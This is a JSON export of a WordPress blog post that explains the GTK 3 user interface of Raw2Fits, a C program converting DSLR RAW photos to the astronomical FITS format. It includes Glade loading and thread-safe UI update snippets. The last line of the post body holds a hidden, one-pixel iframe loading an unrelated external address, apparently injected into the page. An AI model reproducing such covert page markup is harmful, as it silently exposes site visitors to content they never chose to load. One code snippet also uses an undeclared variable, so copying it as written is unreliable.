{"id":146,"date":"2017-11-02T02:28:45","date_gmt":"2017-11-01T23:28:45","guid":{"rendered":"http:\/\/olegkutkov.me\/?p=146"},"modified":"2021-02-04T17:27:02","modified_gmt":"2021-02-04T15:27:02","slug":"converting-dslr-raw-images-scientific-fits-format-part-1-ui","status":"publish","type":"post","link":"https:\/\/olegkutkov.me\/2017\/11\/02\/converting-dslr-raw-images-scientific-fits-format-part-1-ui\/","title":{"rendered":"Converting DSLR RAW images into scientific FITS format. Part 1: UI"},"content":{"rendered":"<p><img loading=\"lazy\" decoding=\"async\" class=\"alignleft wp-image-152 size-thumbnail\" src=\"http:\/\/olegkutkov.me\/wp-content\/uploads\/2017\/11\/raw2fits_screenshot-150x150.png\" alt=\"\" width=\"150\" height=\"150\" \/>FITS is an open standard defining a digital file format useful for storing, transmitting, and processing scientific and other images. FITS is the most commonly used digital file format in astronomy. Unlike many image formats, FITS is designed specifically for scientific data and hence includes many provisions for describing photometric and spatial calibration information, together with image origin metadata.\u00a0 (Wikipedia (c)).<br \/>\nMost of the astronomical software and hardware produces and working only with FITS files.<br \/>\nBut there are many astrophotographers and amateurs astronomers (actually, not all are real amateurs \ud83d\ude42 ) who use only modern DSLR cameras and shooting in RAW format.<br \/>\nModern DSLR cameras can be used for serious science, like searching for variable stars or astrometry of some objects. But the only way to do that &#8211; convert RAW files to the FITS format for future processing in astronomical software.<br \/>\nI wrote a little program that solves this problem and allows easily convert files in a batch mode.<\/p>\n<p>In this article, I want to describe in detail how it works.<\/p>\n<p><!--more--><\/p>\n<p>Please jump to this article if you need technical details about the libraw: <a href=\"http:\/\/olegkutkov.me\/2018\/05\/16\/converting-dslr-raw-images-into-scientific-fits-format-part-2-working-with-libraw\/\">Part 2: working with LIBRAW.<\/a><\/p>\n<p>The program is written in pure C with GTK 3 user interface.<br \/>\nAll external dependencies are only LibRaw (the latest stable versions from <a href=\"https:\/\/www.libraw.org\/download\">the official site<\/a> are preferable to versions in distros) and cfitsio.<br \/>\nLibRaw is used to read images and metadata from the RAW files and support many camera vendors and models.<br \/>\n<a href=\"https:\/\/heasarc.gsfc.nasa.gov\/fitsio\/\">Cfits<\/a> is a popular C library for working FITS files.<\/p>\n<p>Source code is available here: <a href=\"https:\/\/github.com\/olegkutkov\/Raw2Fits\">Github Raw2Fits<\/a><\/p>\n<p>It is mainly designed for Linux, but I believe it can be compiled and successfully run on OS X and even Windows OS. All question is in build procedure and dependencies resolution.<\/p>\n<p>The program is under active development and improvements, so some of the article&#8217;s points may be deprecated, sorry.<\/p>\n<p>Here is the user interface.<\/p>\n<p><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter size-full wp-image-152\" src=\"http:\/\/olegkutkov.me\/wp-content\/uploads\/2017\/11\/raw2fits_screenshot.png\" alt=\"\" width=\"626\" height=\"741\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2017\/11\/raw2fits_screenshot.png 626w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2017\/11\/raw2fits_screenshot-253x300.png 253w\" sizes=\"(max-width: 626px) 100vw, 626px\" \/><\/p>\n<p>Very simple.<\/p>\n<p>All you need is just set input and output directories, fill up some text fields, and press &#8220;Start&#8221; button.<br \/>\nAll entered data will be written into FITS headers according to the FITS file standard.<\/p>\n<p>All conversions are doing in background threads. The number of these threads depends on the count of your CPU or cores.<\/p>\n<h2>User interface<\/h2>\n<p>It is made using Glade designed. It&#8217;s simple and intuitive (mostly \ud83d\ude42 ) Here is how it looks in the designer.<\/p>\n<p>Click on the image to see full resolution.<\/p>\n<p><a href=\"http:\/\/olegkutkov.me\/wp-content\/uploads\/2017\/11\/glade_raw2fits.png\"><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter wp-image-155 size-large\" src=\"http:\/\/olegkutkov.me\/wp-content\/uploads\/2017\/11\/glade_raw2fits-1024x546.png\" alt=\"\" width=\"474\" height=\"253\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2017\/11\/glade_raw2fits-1024x546.png 1024w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2017\/11\/glade_raw2fits-300x160.png 300w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2017\/11\/glade_raw2fits-768x409.png 768w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2017\/11\/glade_raw2fits.png 1920w\" sizes=\"(max-width: 474px) 100vw, 474px\" \/><\/a><\/p>\n<p>If you want to learn about UI development with Glade, start with <a href=\"https:\/\/prognotes.net\/2016\/03\/gtk-3-c-code-hello-world-tutorial-using-glade-3\/\">these articles<\/a>.<br \/>\nThis is a good start point.<\/p>\n<p>Here I will say only that Glade doesn&#8217;t produce any code. Only one generated output is a custom XML file with a description of all your windows and UI components.<\/p>\n<p>This file is loading dynamically in your program with GTK function gtk_builder_add_from_file ()<\/p>\n<p>Rapid example.<\/p>\n<pre class=\"prettyprint\">#include &lt;stdio.h&gt;\n#include &lt;gtk\/gtk.h&gt;\n\nint main(int argc, char *argv[])\n{\n    GError *err = NULL;\n    GtkWidget *window;\n    GtkBuilder *builder;\n\n    gtk_init(&amp;argc, &amp;argv);\n\n    builder = gtk_builder_new();\n\n    if (!gtk_builder_add_from_file (builder, \"ui.glade\", &amp;err)) {\n        perror(err-&gt;message);\n        g_object_unref(builder);\n        return -1;\n    }\n\n    window = GTK_WIDGET(gtk_builder_get_object(builder, \"windowname\"));\n\n    gtk_widget_show(window);\n    gtk_main();\n\n    g_object_unref(builder);\n\n    return 0;\n}<\/pre>\n<p>In this example, you got a GtkBuilder object with all UI schema loaded using gtk_builder_add_from_file ()<br \/>\nYou can get any element from this schema by its name using gtk_builder_get_object (), for example, some widget named &#8220;<strong>windowname<\/strong>&#8220;.<\/p>\n<p>Please check out file src\/main.c in my source tree to discover how I am loading and accessing different types of components &#8211; buttons, text inputs, and so on.<\/p>\n<p>Another interesting note about GTK UI is that only one (main) thread can update UI.<\/p>\n<p>In my case, I have multiple threads that are reporting about conversion progress and printing some messages that should be shown somewhere in UI.<br \/>\nBut how to do UI updates from these background threads without ruining GTK runtime?<br \/>\nA good solution is to use GTK idle source with attached callbacks.<br \/>\nConception is straightforward.<br \/>\nSomewhere in your threaded function, it would be best if you created <code>GSource<\/code> object using g_idle_source_new () with <code>functiong_source_set_callback<\/code>(<code>gsource<\/code>, <strong><code>functionname<\/code><\/strong>, <code>arg<\/code>, <code>NULL<\/code>) you can create a callback to the function <strong>functioname<\/strong> with your custom argument arg.<\/p>\n<p>Then call <code>g_source_attach<\/code>(<code>gsource<\/code>, <code>context<\/code>), where context is a global <code>GMainContext object<\/code> that you need to initialize somewhere in your main thread with <code>g_main_context_default()<\/code><br \/>\nAfter that, your <code>&lt;strong&gt;functionname<\/code><\/strong> (with argument <strong>arg<\/strong>) will be called in the main thread.<br \/>\nThis function may implement some UI updates, and arg might be some data that should be displayed.<\/p>\n<pre class=\"prettyprint\">GMainContext *main_context;\n\n\/* this function is \"called\" by my_threaded_function but really executed in the main thread *\/\nstatic gboolean main_thread_func(void *arg)\n{\n    \/\/ do_some_ui_stuff_with_arg(arg)\n\n    return G_SOURCE_REMOVE;  \/\/ don't forget to return this value!\n}\n\n\/* this function is executed in another thread *\/\nvoid my_threaded_function(void *data)\n{\n    GSource *source = g_idle_source_new();\n\n    g_source_set_callback(source, main_thread_func, arg, NULL);\n    g_source_attach(source, main_context);\n    g_source_unref(source);\n}\n\nint main()\n{\n    ...\n\n    main_context = g_main_context_default();\n}<\/pre>\n<p>Please check out <code>logger_msg_preformat()<\/code> or <code>progress_update()<\/code> in <code>src\/main.c<\/code> to see how it works.<\/p>\n<p>It will be continued&#8230;<\/p>\n<p>&nbsp;<\/p>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n","protected":false},"excerpt":{"rendered":"<p>FITS is an open standard defining a digital file format useful for storing, transmitting, and processing scientific and other images. FITS is the most commonly used digital file format in astronomy. Unlike many image formats, FITS is designed specifically for scientific data and hence includes many provisions for describing photometric and spatial calibration information, together [&hellip;]<\/p>\n","protected":false},"author":1,"featured_media":0,"comment_status":"open","ping_status":"open","sticky":false,"template":"","format":"standard","meta":{"footnotes":""},"categories":[11,54],"tags":[14,13,12],"_links":{"self":[{"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/posts\/146"}],"collection":[{"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/posts"}],"about":[{"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/types\/post"}],"author":[{"embeddable":true,"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/users\/1"}],"replies":[{"embeddable":true,"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/comments?post=146"}],"version-history":[{"count":23,"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/posts\/146\/revisions"}],"predecessor-version":[{"id":1740,"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/posts\/146\/revisions\/1740"}],"wp:attachment":[{"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/media?parent=146"}],"wp:term":[{"taxonomy":"category","embeddable":true,"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/categories?post=146"},{"taxonomy":"post_tag","embeddable":true,"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/tags?post=146"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}}